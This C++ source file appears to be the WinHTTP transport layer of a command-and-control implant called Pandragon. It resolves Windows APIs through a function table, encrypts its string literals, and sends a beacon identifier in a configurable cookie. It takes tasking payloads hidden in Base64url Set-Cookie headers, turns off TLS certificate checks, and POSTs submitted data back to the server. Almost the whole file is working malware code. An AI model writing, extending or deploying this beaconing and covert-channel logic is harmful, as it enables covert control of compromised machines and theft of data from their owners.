#include "../../include/generated_config.h"
#if defined(PANDRAGON_ENABLE_HTTP) || defined(PANDRAGON_ENABLE_HTTPS)

#include "../../include/network/winhttp.h"
#include "../../include/network/transport.h"
#include "../../include/network/net_internal.h"
#include "../../include/resolver.h"
#include "../../include/utils.h"
#include "../../include/config_parser.h"
#include "../../include/network/net_abstract.h"  // For custom header getters
#include "../../include/pandragon_runtime.h"
#include <utility>

/*
* RETURNS:
*    Buffer, length of buffer
*
* Caller must __free() the returned content buffer.
*
* Supports both GET and POST methods. POST method uses request body
* for large payloads to avoid URL length limitations.
*/
std::pair<void*, size_t> CurlLikeRequest(functionTable* funcTable, LPCWSTR domain, LPCWSTR path, LPCWSTR userAgent, INTERNET_PORT port) {
    return CurlLikeRequestWithBody(funcTable, domain, path, userAgent, port, nullptr, 0);
}

std::pair<void*, size_t> CurlLikeRequestWithBody(functionTable* funcTable, LPCWSTR domain, LPCWSTR path, LPCWSTR userAgent, INTERNET_PORT port, const void* bodyData, size_t bodyLen) {
    return winhttpRequest(funcTable, domain, path, userAgent, (uint16_t)port, bodyData, bodyLen);
}

std::pair<void*, size_t> winhttpRequest(
    functionTable* funcTable,
    const wchar_t*   host,
    const wchar_t*   path,
    const wchar_t*   userAgent,
    uint16_t         port,
    const void*      bodyData,
    size_t           bodyLen
) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwFlags = 0;
    DWORD dwSize = 0, dwDownloaded = 0;
    DWORD dwError = 0;
    DWORD timeout = 30000;
    DWORD dwSecureFlag = 0;
    BYTE buffer[4096];
    BOOL bResults = FALSE;
    char* content = NULL;
    size_t contentLen = 0;
    size_t contentCap = 0;
    DWORD readSize = 0;

    // Get max response size from config (default 64MB)
    uint32_t max_response_size = 67108864;
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    max_response_size = runtime.getConfig().max_response_size;
    uint8_t headerCount = 0;
    uint16_t name_len = 0, value_len = 0;
    const char* hdrName = NULL;
    const char* hdrValue = NULL;
    size_t hdrLen = 0;
    wchar_t* hdrWide = NULL;

    // Determine HTTP method: POST if body is present, GET otherwise
    bool usePost = (bodyData != nullptr && bodyLen > 0);
    LPCWSTR httpMethod = usePost ? lcg_encryptw(L"POST") : lcg_encryptw(L"GET");

    (void)dwFlags; (void)dwDownloaded; (void)readSize;  // Used only in DEBUG

    // Ensure WinHTTP module is loaded
    REQUIRES_MODULE(funcTable, ModuleCache::Module::WINHTTP);

    // Open session
    VERBOSE("[winhttp] Opening WinHTTP session with UA: %ls", userAgent ? userAgent : L"(null)");
    hSession = funcTable->WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        debugPrint("WinHttpOpen failed: %lu", funcTable->GetLastError());
        goto cleanup;
    }
    VERBOSE("Using UA (len=%d): %ls", userAgent ? (int)__wcslen(userAgent) : -1, userAgent);

    // Connect to server with specified port
    VERBOSE("[winhttp] Connecting to %ls:%u", host ? host : L"(null)", (unsigned)port);
    hConnect = funcTable->WinHttpConnect(hSession, host, (INTERNET_PORT)port, 0);
    if (!hConnect) {
        dwError = funcTable->GetLastError();
        debugPrint("WinHttpConnect failed: %lu", dwError);
        goto cleanup;
    }

    // Create request (GET or POST /path)
    VERBOSE("[winhttp] Opening %ls request for: %ls", httpMethod, path ? path : L"(null)");
    dwSecureFlag = isChannelSecure() ? WINHTTP_FLAG_SECURE : 0;
    hRequest = funcTable->WinHttpOpenRequest(hConnect, httpMethod, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwSecureFlag);
    if (!hRequest) {
        dwError = funcTable->GetLastError();
        debugPrint("WinHttpOpenRequest failed: %lu", dwError);
        goto cleanup;
    }
    VERBOSE("[winhttp] Request handle opened: %p (%s, %ls)", (void*)hRequest, isChannelSecure() ? "HTTPS" : "HTTP", httpMethod);

    // Set timeouts (30 seconds for all operations)
    funcTable->WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);

    // Set option to ignore SSL certificate errors (self-signed certs) - HTTPS only
    if (isChannelSecure()) {
        bool ignoreCertErrors = false;
        #ifdef DEBUG
            ignoreCertErrors = true;
        #else
            ignoreCertErrors = !g_state.validate_ssl;
        #endif

        if (ignoreCertErrors) {
            dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            bResults = funcTable->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            if (!bResults) {
                dwError = funcTable->GetLastError();
                debugPrint("WinHttpSetOption(SECURITY_FLAGS) failed: %lu", dwError);
            }
        }
    }

    // Add custom HTTP headers if configured (poll or submit based on direction)
    headerCount = (getRequestDirection() == RequestDirection::POLL)
        ? getPollCustomHTTPHeaderCount()
        : getSubmitCustomHTTPHeaderCount();
    for (uint8_t i = 0; i < headerCount; i++) {
        hdrName = (getRequestDirection() == RequestDirection::POLL)
            ? getPollCustomHTTPHeader(i, &name_len, &value_len)
            : getSubmitCustomHTTPHeader(i, &name_len, &value_len);
        hdrValue = (getRequestDirection() == RequestDirection::POLL)
            ? getPollCustomHeaderValue(i)
            : getSubmitCustomHeaderValue(i);
        if (!hdrName || !hdrValue) continue;

        // Expand macros in header value
        char* expandedValue = expandMacros(hdrValue);
        const char* finalValue = expandedValue ? expandedValue : hdrValue;
        size_t finalValueLen = expandedValue ? __strlen(expandedValue) : value_len;

        // Calculate total length: name + ": " + value + null
        hdrLen = name_len + 2 + finalValueLen;
        hdrWide = (wchar_t*)__malloc((hdrLen + 1) * sizeof(wchar_t));
        if (!hdrWide) {
            // Allocation failed - free expandedValue and skip this header
            if (expandedValue) __free(expandedValue);
            expandedValue = NULL;
            continue;
        }
        if (hdrWide) {
            // Copy name
            for (size_t j = 0; j < name_len; j++) hdrWide[j] = (wchar_t)hdrName[j];
            // Add ": "
            hdrWide[name_len] = L':';
            hdrWide[name_len + 1] = L' ';
            // Copy expanded value
            for (size_t j = 0; j < finalValueLen; j++) hdrWide[name_len + 2 + j] = (wchar_t)finalValue[j];
            // Null terminate
            hdrWide[hdrLen] = L'\0';

            // Add header to request
            bResults = funcTable->WinHttpAddRequestHeaders(hRequest, hdrWide, -1,
                WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
            if (!bResults) {
                dwError = funcTable->GetLastError();
                debugPrint("WinHttpAddRequestHeaders failed for header %u: %lu", i, dwError);
            } else {
                VERBOSE("Added custom header %u: %ls (expanded from '%s')", i, hdrWide, hdrValue);
            }

            __free(hdrWide);
            hdrWide = NULL;
        }

        if (expandedValue) __free(expandedValue);
    }

    // Inject Cookie header with beacon identity if request cookie name is configured
    {
        const char* cookieName = (getRequestDirection() == RequestDirection::POLL)
            ? getPollCookieName()
            : getSubmitCookieName();
        if (cookieName && cookieName[0] != '\0' && g_state.beacon_id) {
            // Base64url-encode the 8-byte beacon_id for the cookie value
            char* encodedId = b64UrlEncode(g_state.beacon_id, 8);
            if (encodedId) {
                size_t cnLen = __strlen(cookieName);
                size_t evLen = __strlen(encodedId);
                // Build "name=value" portion
                char* cookiePair = (char*)__malloc(cnLen + 1 + evLen + 1);
                if (cookiePair) {
                    __memcpy(cookiePair, cookieName, cnLen);
                    cookiePair[cnLen] = '=';
                    __memcpy(cookiePair + cnLen + 1, encodedId, evLen);
                    cookiePair[cnLen + 1 + evLen] = '\0';

                    // Build full "Cookie: name=value" header
                    size_t hdrFullLen = 8 + cnLen + 1 + evLen; // "Cookie: " + pair
                    wchar_t* cookieHdr = (wchar_t*)__malloc((hdrFullLen + 1) * sizeof(wchar_t));
                    if (cookieHdr) {
                        // "Cookie: "
                        const wchar_t prefix[] = L"Cookie: ";
                        for (int ci = 0; ci < 8; ci++) cookieHdr[ci] = prefix[ci];
                        // Append name=value
                        for (size_t ci = 0; ci < cnLen + 1 + evLen; ci++)
                            cookieHdr[8 + ci] = (wchar_t)(unsigned char)cookiePair[ci];
                        cookieHdr[hdrFullLen] = L'\0';

                        bResults = funcTable->WinHttpAddRequestHeaders(hRequest, cookieHdr, -1,
                            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
                        if (!bResults) {
                            dwError = funcTable->GetLastError();
                            debugPrint("WinHttpAddRequestHeaders(Cookie) failed: %lu", dwError);
                        } else {
                            VERBOSE("Added Cookie header: %ls", cookieHdr);
                        }
                        __free(cookieHdr);
                    }
                    __free(cookiePair);
                }
                __free(encodedId);
            }
        }
    }

    // For POST requests, add Content-Type header if body data is present
    if (usePost && bodyData && bodyLen > 0) {
        // Add Content-Type: application/octet-stream for binary POST data
        const wchar_t* contentTypeHeader = lcg_encryptw(L"Content-Type: application/octet-stream");
        bResults = funcTable->WinHttpAddRequestHeaders(hRequest, contentTypeHeader, -1,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
        if (!bResults) {
            dwError = funcTable->GetLastError();
            debugPrint("WinHttpAddRequestHeaders(Content-Type) failed: %lu", dwError);
        }
    }

    // Send request (with body data for POST)
    VERBOSE("[winhttp] Sending HTTP %ls request...", httpMethod);
    if (usePost && bodyData && bodyLen > 0) {
        // POST: send with body data
        bResults = funcTable->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                                    (LPVOID)bodyData, (DWORD)bodyLen, (DWORD)bodyLen, 0);
    } else {
        // GET: send without body
        bResults = funcTable->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }
    if (!bResults) {
        dwError = funcTable->GetLastError();
        debugPrint("WinHttpSendRequest failed: %lu", dwError);
        goto cleanup;
    }
    VERBOSE("[winhttp] Request sent, waiting for response...");

    // Receive response
    bResults = funcTable->WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        dwError = funcTable->GetLastError();
        debugPrint("WinHttpReceiveResponse failed: %lu", dwError);
        goto cleanup;
    }
    VERBOSE("[winhttp] Response received, checking for Set-Cookie payload...");

    // Check for Set-Cookie response payload delivery
    {
        const char* respCookieName = getPollResponseCookieName();
        if (respCookieName && respCookieName[0] != '\0') {
            // Query raw response headers as CRLF-separated string
            DWORD headerLen = 0;
            BOOL hdrResult = funcTable->WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_RAW_HEADERS_CRLF,
                WINHTTP_HEADER_NAME_BY_INDEX,
                NULL, &headerLen,
                WINHTTP_NO_HEADER_INDEX);

            if (hdrResult && headerLen > 0) {
                wchar_t* rawHeaders = (wchar_t*)__malloc(headerLen + sizeof(wchar_t));
                if (rawHeaders) {
                    hdrResult = funcTable->WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_RAW_HEADERS_CRLF,
                        WINHTTP_HEADER_NAME_BY_INDEX,
                        rawHeaders, &headerLen,
                        WINHTTP_NO_HEADER_INDEX);

                    if (hdrResult) {
                        rawHeaders[headerLen / sizeof(wchar_t)] = L'\0';

                        // Search for "Set-Cookie: <name>=" within raw headers
                        size_t cnLen = __strlen(respCookieName);
                        const wchar_t* scan = rawHeaders;
                        while (*scan) {
                            // Look for "Set-Cookie:" (case-insensitive prefix via WinHTTP preserves server casing)
                            const wchar_t* scPos = __wcsstr(scan, L"Set-Cookie: ");
                            if (!scPos) {
                                // Try lowercase
                                scPos = __wcsstr(scan, L"set-cookie: ");
                            }
                            if (!scPos) break;

                            // Move past "Set-Cookie: " (12 chars)
                            const wchar_t* nameStart = scPos + 12;

                            // Check if cookie name matches
                            bool nameMatch = false;
                            size_t ci;
                            for (ci = 0; ci < cnLen; ci++) {
                                if ((wchar_t)(unsigned char)respCookieName[ci] != nameStart[ci]) break;
                            }
                            if (ci == cnLen && nameStart[ci] == L'=') {
                                nameMatch = true;
                            }

                            if (nameMatch) {
                                // Extract value: after "name=" until ';' or end of line
                                const wchar_t* valStart = nameStart + cnLen + 1;
                                const wchar_t* valEnd = __wcschr(valStart, L';');
                                if (!valEnd) {
                                    valEnd = __wcschr(valStart, L'\r');
                                    if (!valEnd) valEnd = __wcschr(valStart, L'\n');
                                    if (!valEnd) valEnd = valStart + __wcslen(valStart);
                                }

                                size_t valLen = valEnd - valStart;
                                if (valLen > 0) {
                                    // Convert wide to narrow
                                    char* narrowVal = (char*)__malloc(valLen + 1);
                                    if (narrowVal) {
                                        for (size_t ci2 = 0; ci2 < valLen; ci2++) {
                                            narrowVal[ci2] = (char)valStart[ci2];
                                        }
                                        narrowVal[valLen] = '\0';

                                        // Base64url-decode the cookie value
                                        size_t decodedLen = 0;
                                        unsigned char* decoded = b64UrlDecode(narrowVal, valLen, &decodedLen);
                                        if (decoded && decodedLen > 0) {
                                            // Use decoded content instead of reading body
                                            content = (char*)decoded;
                                            contentLen = decodedLen;
                                            contentCap = decodedLen;
                                            c_debugPrint(funcTable, "[winhttp] Extracted %zu bytes from Set-Cookie '%s'",
                                                decodedLen, respCookieName);
                                            // Signal to skip body reading by zeroing dwSize loop condition
                                            dwSize = 0;
                                        } else {
                                            debugPrint("[winhttp] Failed to decode Set-Cookie value for '%s' (len=%zu)",
                                                respCookieName, valLen);
                                        }
                                        __free(narrowVal);
                                    }
                                }
                                break; // Found our cookie, stop searching
                            }

                            // Move past this header line
                            scan = scPos + 12;
                            const wchar_t* eol = __wcschr(scan, L'\n');
                            if (eol) scan = eol + 1;
                            else break;
                        }
                    }
                    __free(rawHeaders);
                }
            }
        }
    }

    // Read body chunks with geometric growth
    do {
        // Skip body reading if we already extracted payload from Set-Cookie
        if (dwSize == 0 && contentLen > 0) break;
        bResults = funcTable->WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (!bResults || dwSize == 0) break;

        readSize = (dwSize > sizeof(buffer)) ? sizeof(buffer) : dwSize;
        bResults = funcTable->WinHttpReadData(hRequest, buffer, readSize, &dwDownloaded);
        if (!bResults || dwDownloaded == 0) break;

        // Geometric growth: double capacity when needed
        size_t needed = contentLen + dwDownloaded + 1;
        if (needed > contentCap) {
            size_t newCap = (contentCap == 0) ? 4096 : contentCap;
            while (newCap < needed) newCap *= 2;
            char* newContent = (char*)__malloc(newCap);
            if (!newContent) break;
            if (content) {
                __memcpy(newContent, content, contentLen);
                __free(content);
            }
            content = newContent;
            contentCap = newCap;
        }
        __memcpy(content + contentLen, buffer, dwDownloaded);
        contentLen += dwDownloaded;
        
        // Check max response size
        if (contentLen > max_response_size) {
            c_debugPrint(funcTable, "[winhttp] Response too large (%zu bytes, max=%u), truncating",
                         contentLen, (unsigned)max_response_size);
            contentLen = max_response_size;
            break;
        }
        
        content[contentLen] = '\0';
    } while (dwSize > 0);

    VERBOSE("[winhttp] Read %zu bytes from server", contentLen);

    if (content) {
        debugPrint("[winhttp] Content received from server (%zu bytes):\n%s\n", contentLen, content);
    } else {
        debugPrint("[winhttp] No content received from server");
    }

cleanup:
    VERBOSE("Cleaning up! (hSession=%p, hConnect=%p, hRequest=%p)", hSession, hConnect, hRequest);
    if (hRequest) funcTable->NtClose(hRequest);
    if (hConnect) funcTable->NtClose(hConnect);
    if (hSession) funcTable->NtClose(hSession);
    return std::make_pair(content, contentLen);
}
#endif
